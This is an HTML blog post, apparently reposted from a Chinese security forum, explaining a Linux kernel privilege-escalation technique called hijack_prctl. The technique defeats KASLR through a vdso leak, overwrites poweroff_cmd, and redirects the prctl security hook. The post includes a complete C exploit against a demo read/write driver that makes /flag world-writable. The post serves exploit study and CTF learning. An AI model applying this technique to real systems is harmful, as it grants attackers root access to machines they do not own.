@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三)  - povcfe&#39;s blog</title><meta name="Description" content="povcfe&#39;s blog"><meta property="og:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三) " />
+<meta property="og:description" content="发表于看雪论坛
+hijack_prctl篇   prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互
+ 用户态执行prctl函数后触发prctl系统调用 内核接收参数后执行security_task_prctl security_task_prctl执行hook.task_prctl    poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd
+  攻击流程:
+ 劫持hook.task_prctl为目标函数地址(poweroff_work_func) 修改poweroff_cmd为目标指令 用户执行prctl函数，触发    一. 利用步骤 1. 定位内核加载基地址(开启kaslr)  同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址  2. 定位hook.prctl，poweroff_cmd地址   gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址
+  gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址
+  获得hook.prctl，poweroff_cmd与内核基地址固定偏移
+  3. 修改poweroff_cmd 为任意指令 4. 用户态执行prctl函数，触发 二. 驱动代码(见cred篇) 三. exp #define _GNU_SOURCE  #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/auxv.h&gt;#include &lt;sys/prctl." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://povcfe.github.io/posts/kernel_rw3/" />
+<meta property="og:image" content="https://povcfe.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-01-30T10:32:30-08:00" />
+<meta property="article:modified_time" content="2020-01-30T10:32:30-08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://povcfe.github.io/logo.png"/>
+
+<meta name="twitter:title" content="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三) "/>
+<meta name="twitter:description" content="发表于看雪论坛
+hijack_prctl篇   prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互
+ 用户态执行prctl函数后触发prctl系统调用 内核接收参数后执行security_task_prctl security_task_prctl执行hook.task_prctl    poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd
+  攻击流程:
+ 劫持hook.task_prctl为目标函数地址(poweroff_work_func) 修改poweroff_cmd为目标指令 用户执行prctl函数，触发    一. 利用步骤 1. 定位内核加载基地址(开启kaslr)  同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址  2. 定位hook.prctl，poweroff_cmd地址   gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址
+  gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址
+  获得hook.prctl，poweroff_cmd与内核基地址固定偏移
+  3. 修改poweroff_cmd 为任意指令 4. 用户态执行prctl函数，触发 二. 驱动代码(见cred篇) 三. exp #define _GNU_SOURCE  #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/auxv.h&gt;#include &lt;sys/prctl."/>
+<meta name="application-name" content="povcfe&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="povcfe&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://povcfe.github.io/posts/kernel_rw3/" /><link rel="prev" href="https://povcfe.github.io/posts/kernel_rw2/" /><link rel="next" href="https://povcfe.github.io/posts/kernel_rw4/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "linux 内核提权总结(demo+exp分析) -- 任意读写(三) ",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/povcfe.github.io\/posts\/kernel_rw3\/"
+        },"genre": "posts","keywords": "linux kernel, rw, exp","wordcount":  274 ,
+        "url": "https:\/\/povcfe.github.io\/posts\/kernel_rw3\/","datePublished": "2020-01-30T10:32:30-08:00","dateModified": "2020-01-30T10:32:30-08:00","publisher": {
+            "@type": "Organization",
+            "name": "作者"},"author": {
+                "@type": "Person",
+                "name": "作者"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="povcfe&#39;s blog">povcfe&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="povcfe&#39;s blog">povcfe&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">linux 内核提权总结(demo&#43;exp分析) -- 任意读写(三) </h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>作者</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/linux%E5%86%85%E6%A0%B8%E6%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="far fa-folder fa-fw"></i>linux内核态漏洞利用</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-01-30">2020-01-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 274 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#hijack_prctl篇">hijack_prctl篇</a>
+      <ul>
+        <li><a href="#一-利用步骤">一. 利用步骤</a></li>
+        <li><a href="#二-驱动代码见cred篇">二. 驱动代码(见cred篇)</a></li>
+        <li><a href="#三-exp">三. exp</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://bbs.pediy.com/user-839858.htm" target="_blank" rel="noopener noreffer">发表于看雪论坛</a></p>
+<h2 id="hijack_prctl篇">hijack_prctl篇</h2>
+<ul>
+<li>
+<p>prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互</p>
+<ol>
+<li>用户态执行prctl函数后触发prctl系统调用</li>
+<li>内核接收参数后执行security_task_prctl</li>
+<li>security_task_prctl执行hook.task_prctl</li>
+</ol>
+</li>
+<li>
+<p>poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd</p>
+</li>
+<li>
+<p>攻击流程:</p>
+<ol>
+<li>劫持hook.task_prctl为目标函数地址(poweroff_work_func)</li>
+<li>修改poweroff_cmd为目标指令</li>
+<li>用户执行prctl函数，触发</li>
+</ol>
+</li>
+</ul>
+<h3 id="一-利用步骤">一. 利用步骤</h3>
+<h4 id="1-定位内核加载基地址开启kaslr">1. 定位内核加载基地址(开启kaslr)</h4>
+<ul>
+<li>同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址</li>
+</ul>
+<h4 id="2-定位hookprctlpoweroff_cmd地址">2. 定位hook.prctl，poweroff_cmd地址</h4>
+<ul>
+<li>
+<p>gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址</p>
+</li>
+<li>
+<p>gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址</p>
+</li>
+<li>
+<p>获得hook.prctl，poweroff_cmd与内核基地址固定偏移</p>
+</li>
+</ul>
+<h4 id="3-修改poweroff_cmd-为任意指令">3. 修改poweroff_cmd 为任意指令</h4>
+<h4 id="4-用户态执行prctl函数触发">4. 用户态执行prctl函数，触发</h4>
+<h3 id="二-驱动代码见cred篇">二. 驱动代码(见cred篇)</h3>
+<h3 id="三-exp">三. exp</h3>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
+</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/auxv.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define CHANGE_POINT 0x100000
+</span><span class="cp">#define RW_READ 0x100001
+</span><span class="cp">#define RW_WRITE 0x100002
+</span><span class="cp">#define SET_MEM 0X100003
+</span><span class="cp"></span>
+<span class="n">size_t</span> <span class="n">poweroff_cmd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">size_t</span> <span class="n">prctl_hook</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">size_t</span> <span class="n">poweroff_work_func</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">size_t</span> <span class="n">vmlinux_base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">vunl</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">point</span><span class="p">;</span>
+    <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">VUNL</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">leak_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="mh">0xffffffff80000000</span><span class="p">;</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span> <span class="n">addr</span> <span class="o">+=</span> <span class="mh">0x1000</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">VUNL</span><span class="p">.</span><span class="n">point</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">;</span>
+
+        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANGE_POINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">VUNL</span><span class="p">);</span> <span class="c1">//change the point
+</span><span class="c1"></span>        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RW_READ</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;gettimeofday&#34;</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x2b5</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] the addr of VDSO is: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
+            <span class="n">vmlinux_base</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffffff000000</span><span class="p">;</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] the addr of vmlinux base is: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">vmlinux_base</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] not found, try again!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">cmd</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;/bin/chmod 777 /flag</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">;</span>
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/rw_any_dev&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="n">leak_data</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+    <span class="n">poweroff_cmd</span> <span class="o">=</span> <span class="n">vmlinux_base</span> <span class="o">+</span> <span class="mh">0xe3e1a0</span><span class="p">;</span>
+    <span class="n">prctl_hook</span> <span class="o">=</span> <span class="n">vmlinux_base</span> <span class="o">+</span> <span class="mh">0xe81078</span><span class="p">;</span>
+    <span class="n">poweroff_work_func</span> <span class="o">=</span> <span class="n">vmlinux_base</span> <span class="o">+</span> <span class="mh">0x075480</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] the addr of poweroff_cmd is: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">poweroff_cmd</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] the addr of prctl hook is: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prctl_hook</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] the addr of orderly_poweroff is: 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">poweroff_work_func</span><span class="p">);</span>
+
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+    <span class="c1">// VUNL.size = strlen(argv[1])+1;
+</span><span class="c1"></span>    <span class="n">VUNL</span><span class="p">.</span><span class="n">point</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">poweroff_cmd</span><span class="p">;</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANGE_POINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">VUNL</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RW_WRITE</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>
+    <span class="c1">// ioctl(fd, RW_WRITE, argv[1]);
+</span><span class="c1"></span>
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">VUNL</span><span class="p">.</span><span class="n">point</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">prctl_hook</span><span class="p">;</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">CHANGE_POINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">VUNL</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RW_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">poweroff_work_func</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] the cmd arg must have an ansolute_address&#34;</span><span class="p">);</span>
+    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_GET_NAME</span><span class="p">,</span> <span class="s">&#34;test&#34;</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-01-30</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux-kernel/">linux kernel</a>,&nbsp;<a href="/tags/rw/">rw</a>,&nbsp;<a href="/tags/exp/">exp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/kernel_rw2/" class="prev" rel="prev" title="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二)"><i class="fas fa-angle-left fa-fw"></i>linux 内核提权总结(demo&#43;exp分析) -- 任意读写(二)</a>
+            <a href="/posts/kernel_rw4/" class="next" rel="next" title="linux 内核提权总结(demo&#43;exp分析) -- 任意读写(四)">linux 内核提权总结(demo&#43;exp分析) -- 任意读写(四)<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
